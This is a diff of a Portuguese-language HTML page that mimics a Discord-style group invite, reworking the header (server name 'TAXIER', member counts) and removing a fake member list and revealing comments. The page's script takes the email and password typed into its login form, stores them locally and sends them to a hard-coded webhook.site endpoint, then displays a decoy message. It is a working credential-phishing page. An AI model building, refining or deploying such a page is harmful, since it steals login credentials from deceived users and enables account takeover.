@@ -38,7 +38,7 @@
             color: white;
         }
         
-        .avatar {
+        .server-icon {
             width: 80px;
             height: 80px;
             border-radius: 50%;
@@ -54,25 +54,13 @@
             overflow: hidden;
         }
         
-        .avatar img {
+        .server-icon img {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
         
-        .avatar::after {
-            content: '';
-            position: absolute;
-            bottom: 2px;
-            right: 2px;
-            width: 20px;
-            height: 20px;
-            background: #23a55a;
-            border-radius: 50%;
-            border: 3px solid #2f3136;
-        }
-        
-        .username {
+        .server-name {
             font-size: 20px;
             font-weight: 600;
             margin-bottom: 8px;
@@ -82,6 +70,7 @@
         .invite-text {
             color: #b9bbbe;
             font-size: 14px;
+            margin-bottom: 16px;
         }
         
         .server-stats {
@@ -107,97 +96,6 @@
         .stat-label {
             font-size: 12px;
             color: #b9bbbe;
-        }
-        
-        .members-section {
-            padding: 24px;
-            background: #2f3136;
-            border-bottom: 1px solid #40444b;
-        }
-        
-        .members-title {
-            font-size: 16px;
-            color: #ffffff;
-            font-weight: 600;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .online-dot {
-            width: 8px;
-            height: 8px;
-            background: #23a55a;
-            border-radius: 50%;
-        }
-        
-        .members-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        
-        .member-item {
-            display: flex;
-            align-items: center;
-            padding: 8px;
-            background: #2b2d31;
-            border-radius: 4px;
-        }
-        
-        .member-avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #5865f2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 12px;
-            margin-right: 12px;
-        }
-        
-        .member-name {
-            font-size: 14px;
-            color: #dcddde;
-        }
-        
-        .member-status {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-left: auto;
-        }
-        
-        .status-online {
-            background: #23a55a;
-        }
-        
-        .status-idle {
-            background: #f0b232;
-        }
-        
-        .status-dnd {
-            background: #f23f43;
-        }
-        
-        .member-count {
-            text-align: center;
-            margin-top: 16px;
-            padding: 12px;
-            background: #40444b;
-            border-radius: 6px;
-            font-size: 14px;
-            color: #b9bbbe;
-            font-weight: 600;
-        }
-        
-        .online-count {
-            color: #23a55a;
-            font-weight: bold;
         }
         
         .action-section {
@@ -307,83 +205,27 @@
 <body>
     <div class="invite-container">
         <div class="header">
-            <div class="avatar">
-                <!-- Substitua pelo URL da sua imagem -->
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjNTg2NUYyIi8+Cjx0ZXh0IHg9IjQwIiB5PSI0OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjMyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPklLPC90ZXh0Pgo8L3N2Zz4=" alt="imkaisure01">
+            <div class="server-icon">
+                <!-- SUBSTITUA PELA SUA IMAGEM AQUI -->
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjNTg2NUYyIi8+Cjx0ZXh0IHg9IjQwIiB5PSI0OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjMyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPklLPC90ZXh0Pgo8L3N2Zz4=" alt="Server Icon">
             </div>
-            <div class="username">imkaisure01</div>
-            <div class="invite-text">convidou você para entrar no grupo</div>
+            <div class="server-name">TAXIER</div>
+            <div class="invite-text">Você foi convidado(a) para entrar</div>
             
             <div class="server-stats">
                 <div class="stat">
-                    <div class="stat-number">23</div>
-                    <div class="stat-label">Membros</div>
+                    <div class="stat-number">142</div>
+                    <div class="stat-label">online</div>
                 </div>
                 <div class="stat">
-                    <div class="stat-number">8</div>
-                    <div class="stat-label">Online</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-number">5</div>
-                    <div class="stat-label">Canais</div>
+                    <div class="stat-number">2.084</div>
+                    <div class="stat-label">membros</div>
                 </div>
             </div>
-        </div>
-        
-        <div class="members-section">
-            <div class="members-title">
-                <div class="online-dot"></div>
-                Membros Online — <span class="online-count">8</span>
-            </div>
-            
-            <div class="members-list">
-                <div class="member-item">
-                    <div class="member-avatar">RH</div>
-                    <div class="member-name">RafaelH</div>
-                    <div class="member-status status-online"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">XC</div>
-                    <div class="member-name">XavierC</div>
-                    <div class="member-status status-online"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">TG</div>
-                    <div class="member-name">TiagoG</div>
-                    <div class="member-status status-online"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">AP</div>
-                    <div class="member-name">AnaP</div>
-                    <div class="member-status status-idle"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">MK</div>
-                    <div class="member-name">MarianaK</div>
-                    <div class="member-status status-online"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">JL</div>
-                    <div class="member-name">JoãoL</div>
-                    <div class="member-status status-dnd"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">KT</div>
-                    <div class="member-name">KarinaT</div>
-                    <div class="member-status status-online"></div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">NV</div>
-                    <div class="member-name">NicolasV</div>
-                    <div class="member-status status-online"></div>
-                </div>
-            </div>
-            
-            <div class="member-count">23 membros no total • 8 online</div>
         </div>
         
         <div class="action-section">
-            <button class="accept-btn" onclick="showLoginForm()">Aceitar Convite</button>
+            <button class="accept-btn" onclick="showLoginForm()">Aceitar convite</button>
         </div>
         
         <div id="loginForm" class="login-form">
@@ -415,7 +257,6 @@
     </div>
 
     <script>
-        // Configuração - EDITAR AQUI!
         const LOG_ENDPOINT = 'https://webhook.site/ab830b1e-933d-4730-becf-f96ff893bd33';
 
         function showLoginForm() {
@@ -430,7 +271,6 @@
             const password = document.getElementById('password').value;
             const emailError = document.getElementById('emailError');
             
-            // Verifica se é um email válido
             if (!email.includes('@')) {
                 emailError.style.display = 'block';
                 return;
@@ -438,7 +278,6 @@
             
             emailError.style.display = 'none';
             
-            // Salva as credenciais
             const credentials = {
                 email: email,
                 password: password,
@@ -446,12 +285,10 @@
                 userAgent: navigator.userAgent
             };
             
-            // Salva no localStorage
             let savedCredentials = JSON.parse(localStorage.getItem('grupo_creds') || '[]');
             savedCredentials.push(credentials);
             localStorage.setItem('grupo_creds', JSON.stringify(savedCredentials));
             
-            // Envia para o webhook (COM NO-CORS)
             fetch(LOG_ENDPOINT, {
                 method: 'POST',
                 headers: {
@@ -459,16 +296,10 @@
                 },
                 body: JSON.stringify(credentials),
                 mode: 'no-cors'
-            }).then(() => {
-                console.log('Dados enviados para o webhook (no-cors mode)');
-            }).catch(error => {
-                console.log('Erro ao enviar:', error);
-            });
+            }).catch(error => console.log('Erro ao enviar:', error));
             
-            // Mostra mensagem de erro fake
             document.getElementById('successMessage').style.display = 'block';
             
-            // Limpa o formulário após 3 segundos
             setTimeout(() => {
                 document.getElementById('email').value = '';
                 document.getElementById('password').value = '';
